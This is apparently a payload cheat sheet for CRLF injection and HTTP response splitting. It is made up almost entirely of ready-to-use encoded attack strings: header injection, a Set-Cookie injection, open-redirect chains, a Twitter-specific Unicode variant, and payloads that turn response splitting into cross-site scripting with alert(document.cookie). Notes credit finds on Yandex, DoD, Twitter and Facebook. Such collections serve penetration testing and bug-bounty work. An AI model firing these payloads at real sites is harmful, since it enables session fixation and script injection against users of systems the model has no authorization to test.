## CRLF Injection || HTTP Response Splitting

```
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

**Header-based test, site root**

```
%0d%0aheader:header
```
```
%0aheader:header
```
```
%0dheader:header
```
```
%23%0dheader:header
```
```
%3f%0dheader:header
```

**CRLF chained with Open Redirect server misconfiguration**

_Note:_ This sometimes works. (Discovered in some Yandex sites, was not exploitable from the root.)

```
//www.google.com/%2f%2e%2e%0d%0aheader:header
```
```
/www.google.com/%2e%2e%2f%0d%0aheader:header
```
```
/google.com/%2F..%0d%0aheader:header
```

**Twitter specific CRLF** by [@filedescriptor](http://blog.innerht.ml/twitter-crlf-injection/)

```
%E5%98%8A%E5%98%8Dheader:header
```

**CRLF Injection to XSS**

```
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```

**Response splitting on 302 Redirect, before Location header** (Discovered in DoD)

```
%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E
```

**Response splitting on 301 code, chained with Open Redirect to corrupt location header to break 301** by [@black2fan](https://twitter.com/black2fan) (Facebook bug)

_Note:_ `xxx:1` was used for breaking open redirect destination (Location header). Great example how of to escalate CRLF to XSS on a such, it would seem, unexploitable 301 status code.

```
%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr
```
